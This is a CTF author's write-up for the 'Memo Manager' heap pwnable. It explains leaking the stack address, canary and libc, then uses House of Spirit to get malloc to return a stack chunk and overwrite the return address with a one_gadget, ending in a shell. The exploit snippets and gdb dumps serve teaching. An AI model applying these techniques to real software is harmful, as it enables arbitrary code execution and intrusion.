Hi folks! I hope you're all doing great. First of all, I'd like to thank y'all who participated in 0x00CTF and made this event possible.
I hope you learnt new things from our CTF and I'm pretty sure it won't be the last CTF from 0x00sec ;) Moving on, I was the author
of **Memo Manager**, a heap exploitation related pwnable which I considered it as an intermediate level challenge. If you've never
studied malloc's internals, maybe this write-up isn't suitable for you at the moment. I'll try to be short but effective.

### Summary

```
--==[[ Memo Manager ]]==--

[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
>
```

There is a small overflow if you choose **not** to tap out where you can overwrite the heap pointer returned by `strdup` and perform [House
of Spirit](https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c). The entire binary was based on the following struct:

```c
struct __attribute__ ((__packed__)) pwning {
        char  buf[24];
        char* ptr;
};
```

Which is used to perform both leaks and the heap exploitation attack.

### Exploitation Analysis

The above C structure has the `packed` attribute so that the buffer gets placed **below** the `ptr` member during compliation. That effect
can easily be noticed just by reversing the binary. The `buf` member was used to read in input in case of allocation/tapping out and
`ptr` was used to store the pointer returned by `strdup` on the **stack**. First order of business are the leaks. Libc isn't enough in this case, 
you'll need to leak a stack address & and the canary itself. However, because the local variables haven't been initialized and `read` is called
to read in data, it's quite likely that the allocated stack frame contains "garbage" values. With the help of `strdup` we can get some juicy leaks.

This is the buffer being used in `read`:

```
gdb-peda$ x/10gx 0x7fffffffe480
  
  buf --> 0x7fffffffe480:	0x00007fffffffe4ae	0x0000000000000000
          0x7fffffffe490:	0x0000000000400e20	0x0000000000400870
          0x7fffffffe4a0:	0x00007fffffffe590	0x1dc8d418ac21e700
          0x7fffffffe4b0:	0x0000000000400e20	0x00007ffff7a2d830
          0x7fffffffe4c0:	0x0000000000000001	0x00007fffffffe598
```

As you can notice, there are plenty of "garbage" values such as a text segment address (which would be useful if PIE was on) and
a couple of stack addresses. Actually, because of the aforementioned small overflow, we can even overwrite the stack canary, but 
we definitely don't want that. Instead, we'll leak it later on.

```asm
mov rax, qword [rbp-0x28]
mov edx, 0x30
mov rsi, rax
mov edi, 0x0
call read
```

Here's the stack layout after `read` and right before the `strdup` call.

```
0x7fffffffe480:	0x4141414141414141	0x4141414141414141
0x7fffffffe490:	0x4141414141414141	0x0a41414141414141
0x7fffffffe4a0:	0x00007fffffffe590	0x1dc8d418ac21e700
```

I assume not all of you know how `strdup` works so here is its source code:

```c
/* Duplicate S, returning an identical malloc'd string.  */
char *
__strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);

  if (new == NULL)
    return NULL;

  return (char *) memcpy (new, s, len);
}
```

Basically, it calculates the length of the string (its 1st argument) and allocates a heap chunk containing the content of its 1st argument,
the stack address in this case. Thanks to its properties, combined with the fact that `read` does not null terminate strings, the
stack leak is innevitable. Here's the heap chunk allocated by `strdup`:

```
0x603000:	0x0000000000000000	0x0000000000000031 <-- new chunk
0x603010:	0x4141414141414141	0x4141414141414141
0x603020:	0x4141414141414141	0x0a41414141414141
0x603030:	0x00007fffffffe590	0x0000000000020fd1 <-- top chunk
```

Now, since the heap pointer is stored on the stack, we can select `show` and print the heap content along with the stack address.
That leak will be proven tremendously useful later on.

```python
alloc('A'*0x1f, "yes\x00")
	
buf = stackleak() - 0x110
log.success("Buffer: 0x{:x}".format(buf))
```

We can use the same allocation tactic as we did with the stack leak in order to leak the canary.

```python
alloc('A'*0x28, "yes\x00")
	
canary = canaryLeak()
log.success("Canary: 0x{:x}".format(canary))
```

```
buf --> 0x7fffffffe480:	0x4141414141414141	0x4141414141414141
        0x7fffffffe490:	0x4141414141414141	0x4141414141414141
        0x7fffffffe4a0:	0x4141414141414141	0x1dc8d418ac21e70a <-- canary
```

Stack and canary leak done. If we choose to tap out, we're asked to enter either `yes` or `no`. However, the amount of data being
read is big enough to overwrite the heap pointer on the stack. In particular, the `ptr` member is stored at offset `rbp - 0x10`,
which is just **0x18 bytes ahead** of the of the `buf` member and `read` will read in **0x30** bytes. 

```asm
mov rax, qword [rbp-0x28]
mov edx, 0x30
mov rsi, rax
mov edi, 0x0
call read
```

If we were to overwrite that pointer with a GOT address and then select `show`, we will get back a libc leak.

```python
gup('no\x00'.ljust(0x18, '\x00') + p64(GOT))	
libc     = libcLeak() - 0x36ea0
```

```
Before:

0x7fffffffe480:	0x4141414141414141	0x4141414141414141
0x7fffffffe490:	0x4141414141414141	0x0000000000603040 <-- heap ptr
0x7fffffffe4a0:	0x4141414141414141	0x1dc8d418ac21e70a
```

```
After:

0x7fffffffe480:	0x0000000000006f6e	0x0000000000000000
0x7fffffffe490:	0x0000000000000000	0x0000000000601fe0 <-- GOT address
0x7fffffffe4a0:	0x414141414141410a	0x1dc8d418ac21e70a
```

This was the easy part. Now it's time for the heap stuff. The fact that we have control over **what** gets free'd can be pretty
lethal. Let's think of our findings so far:

* We've got an overflow which can result into tampering the pointer that gets free'd and printed.
* We've got a tiny heap overflow but it's placed there on purpose. [House of Orange](https://github.com/shellphish/how2heap/blob/master/house_of_orange.c) isn't possible. Oh right, the heap overflow,
let me show what I mean by that. When we create a memo, we're asked if we're done with our input. If not, we're prompted with a new 
read which will read in once again **0x30** bytes but this time it will use the **pointer returned by strdup** as a buffer.

```c
else if (!strcmp(choice, "no")) {
  printf("Data: ");
  if (read(0, p->ptr, 0x30) <= 0) {
    puts("Read error!");
    exit(1);
  }
  ...
```

Even though that will cause a tiny heap overflow which is useless, what if we can leverage the fact that we control **what** gets
free'd into a stack overflow? ;) Oops, spoiler!

### House of Spirit

House of Spirit is a heap exploitation attack which is based on the fact that we can control over what gets free'd. By surgically
crafting a fake fast chunk at an arbitrary location that we have control over, we can make `malloc` return an arbitrary location.
Since we have control over the stack and we've got a stack leak already, it's possible to fool `malloc` into returning back a stack address
in order to overwrite the instruction pointer! Let me show you what I mean by that.

Consider the following scenario:

```python
fake_chunk  = p64(0x21)
fake_chunk += p64(0)
fake_chunk += p64(buf + 0x10)
fake_chunk += p64(0)
fake_chunk += p64(0x1234)

gup('no\x00'.ljust(0x8, '\x00') + fake_chunk)
```

```
buf --> 0x7fffffffe480:	0x0000000000006f6e	0x0000000000000021
        0x7fffffffe490:	0x0000000000000000	0x00007fffffffe490 <-- fake heap ptr
        0x7fffffffe4a0:	0x0000000000000000	0x0000000000001234 
        0x7fffffffe4b0:	0x0000000000400e20	0x00007ffff7a2d830
```

We have crafted a fake heap chunk on the stack. What if we call free on `0x00007fffffffe490`?

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x7fffffffe480 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
```

Woooot?! `0x7fffffffe480` got placed in its corresponding fast bin list! How? Well, the fake heap chunk isn't crafted that way
by coincidence. When free-ing a fast chunk, `_int_free_` does the following checks:


```c
  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
```

In other words, it will make sure that the chunk **after** the one currently being free'd has a size **less than** `system_mem`
and **greater than** 0x10.

```
buf --> 0x7fffffffe480:	0x0000000000006f6e	0x0000000000000021 <-- chunk size
        0x7fffffffe490:	0x0000000000000000	0x00007fffffffe490 <-- fake heap ptr
        0x7fffffffe4a0:	0x0000000000000000	0x0000000000001234 <-- next size
        0x7fffffffe4b0:	0x0000000000400e20	0x00007ffff7a2d830
        
gdb-peda$ p main_arena.system_mem 
$4 = 0x21000
gdb-peda$ p 0x7fffffffe480 + 0x20
$5 = 0x7fffffffe4a0
gdb-peda$ x/2gx 0x7fffffffe4a0
0x7fffffffe4a0:	0x0000000000000000	0x0000000000001234
```

As you can see from above, both checks have been bypassed. Now, if the next allocation is of size **0x20**, `0x7fffffffe490`
will be returned back to us and since `read` reads in **0x30** bytes, we will be able to overwrite the return address with 
[one_gadget](https://github.com/david942j/one_gadget)! All we have to do is make `strdup` call `malloc` with a size of less than or equal
to **0x18** (`malloc` aligns the chunks on 16-byte boundaries because of its header metadata).

```
Before:

gdb-peda$ x/10gx 0x7fffffffe480
0x7fffffffe480:	0x0000000a006b656b	0x0000000000000021
0x7fffffffe490:	0x00000000006b656b	0x00007fffffffe490
0x7fffffffe4a0:	0x0000000000000000	0x0000000000001234
0x7fffffffe4b0:	0x0000000000400e20	0x00007ffff7a2d830 <-- return address
gdb-peda$ x 0x00007ffff7a2d830
0x7ffff7a2d830 <__libc_start_main+240>:	0x31000197f9e8c789
```

```python
# We'll get back our stack buffer => restore stack state and call one gadget
alloc("kek\x00", "no\x00", p64(0)*3 + p64(canary) + p64(0) + p64(one_shot))
	
# give up and pop a shell
gup('yes\x00')
```

```
After:

0x7fffffffe480:	0x0000000a006b656b	0x0000000000000021
0x7fffffffe490:	0x0000000000000000	0x0000000000000000
0x7fffffffe4a0:	0x0000000000000000	0x4acaa6515dd0f000
0x7fffffffe4b0:	0x0000000000000000	0x00007ffff7afe117 <-- return address
gdb-peda$ x/5i 0x00007ffff7afe117
   0x7ffff7afe117 <exec_comm+2263>:	mov    rax,QWORD PTR [rip+0x2d2d9a]        # 0x7ffff7dd0eb8
   0x7ffff7afe11e <exec_comm+2270>:	lea    rsi,[rsp+0x70]
   0x7ffff7afe123 <exec_comm+2275>:	lea    rdi,[rip+0x9bbed]        # 0x7ffff7b99d17
   0x7ffff7afe12a <exec_comm+2282>:	mov    rdx,QWORD PTR [rax]
   0x7ffff7afe12d <exec_comm+2285>:	call   0x7ffff7ad9770 <execve>
gdb-peda$ x/s 0x7ffff7b99d17
0x7ffff7b99d17:	"/bin/sh"
```

Booyah! The return address was successfully overwritten! Now if we finally give up, we'll be greeted with a beautiful shell.

```
[+] Buffer: 0x7fffffffe480
[+] Canary: 0x28d54ddd45883100
[+] Libc:   0x7ffff7a0d000
[*] Switching to interactive mode
Quitter!
$ whoami
ubuntu
```
